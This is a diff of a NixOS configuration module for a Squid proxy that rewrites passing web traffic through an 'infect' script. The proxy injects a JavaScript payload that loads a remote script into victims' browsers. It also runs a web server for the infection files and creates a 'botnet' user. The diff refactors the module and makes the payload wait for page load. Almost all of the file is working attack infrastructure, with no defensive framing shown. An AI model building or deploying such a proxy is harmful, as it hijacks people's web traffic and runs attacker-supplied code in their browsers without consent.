@@ -1,21 +1,11 @@
-cfg@{
-  user,
-  group,
-  payloadURL,
-  proxyPort ? 3128,
-  infectionPort ? 13337,
-  infectionDir ? "/var/botnet/infection",
-  stateDir ? "/run/botnet",
-  logDir ? "/var/log/botnet",
-  adminAddr ? "foo"
-}:
+{ payloadUrl }:
 
 { pkgs, ... }:
 
 let
 
   configFile = pkgs.writeText "squid.conf" ''
-    http_port ${toString cfg.proxyPort}
+    http_port 3128
 
     acl all src all
 
@@ -41,10 +31,10 @@ let
     forwarded_for off
     via off
 
-    access_log daemon:${cfg.logDir}/access.log squid
-    cache_log ${cfg.logDir}/cache.log squid
-    pid_filename ${cfg.stateDir}/pid
-    cache_effective_user ${cfg.user}
+    access_log daemon:/var/log/squid/access.log squid
+    cache_log /var/log/squid/cache.log squid
+    pid_filename /run/squid/pid
+    cache_effective_user botnet
 
     url_rewrite_program ${infect}/infect
   '';
@@ -54,8 +44,8 @@ let
     exe = ''
       #!/bin/sh
       export PAYLOAD=${payload}
-      export INFECTION_DIR=${toString cfg.infectionDir}
-      export INFECTION_PORT=${toString cfg.infectionPort}
+      export INFECTION_DIR=/var/quarantine
+      export INFECTION_PORT=13337
       exec ${pkgs.python3}/bin/python3 ${./infect.py}
     '';
     builder = builtins.toFile "builder.sh" ''
@@ -68,34 +58,50 @@ let
 
   payload = builtins.toFile "payload.js" ''
     (function(){
-      if (!window.__OWNED__) {
-          window.__OWNED__ = true;
-          var script = document.createElement('script');
-          script.setAttribute('src', '${cfg.payloadURL}');
-          document.getElementsByTagName('head')[0].appendChild(script);
+      function payload() {
+        if (!window.__OWNED__) {
+            window.__OWNED__ = true;
+            var script = document.createElement('script');
+            script.setAttribute('src', '${payloadUrl}');
+            document.getElementsByTagName('html')[0].appendChild(script);
+        }
+      }
+      if (window.addEventListener) {
+        window.addEventListener('load', payload)
+      } else {
+        window.attachEvent('onload', payload)
       }
     })();
   '';
 
 in {
 
+  users.extraUsers.botnet = {
+    group = "botnet";
+    uid = 1337;
+  };
+
+  users.extraGroups.botnet = {
+    gid = 1337;
+  };
+
   networking.firewall.allowedTCPPorts = [
-    80 cfg.proxyPort
+    80 3128
   ];
 
   services.httpd = {
     enable = true;
-    user = cfg.user;
-    group = cfg.group;
-    adminAddr = cfg.adminAddr;
+    user = "botnet";
+    group = "botnet";
+    adminAddr = "foo";
     virtualHosts = [
       {
         listen = [ { port = 80; } ];
         documentRoot = ./homepage;
       }
       {
-        listen = [ { port = cfg.infectionPort; } ];
-        documentRoot = cfg.infectionDir;
+        listen = [ { port = 13337; } ];
+        documentRoot = "/var/quarantine";
       }
     ];
   };
@@ -105,28 +111,24 @@ in {
     after = [ "network.target" ];
     wantedBy = [ "multi-user.target" ];
 
-    path = [
-      pkgs.squid pkgs.coreutils
-    ];
-
     serviceConfig = {
       Type = "forking";
-      PIDFile = "${cfg.stateDir}/pid";
+      PIDFile = "/run/squid/pid";
       ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
       ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
       ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
     };
 
     preStart = ''
-      [ -d ${cfg.infectionDir} ] && rm -r ${cfg.infectionDir}
-      mkdir -p ${cfg.infectionDir}
-      chown ${cfg.user} ${cfg.infectionDir}
-      cp ${./htaccess} ${cfg.infectionDir}/.htaccess
+      [ -d /var/quarantine ] && rm -r /var/quarantine
+      mkdir -p /var/quarantine
+      chown botnet /var/quarantine
+      cp ${./htaccess} /var/quarantine/.htaccess
 
-      mkdir -p ${cfg.stateDir}
-      mkdir -p ${cfg.logDir}
-      chown ${cfg.user} ${cfg.stateDir}
-      chown ${cfg.user} ${cfg.logDir}
+      mkdir -p /run/squid
+      mkdir -p /var/log/squid
+      chown botnet /run/squid
+      chown botnet /var/log/squid
     '';
 
   };
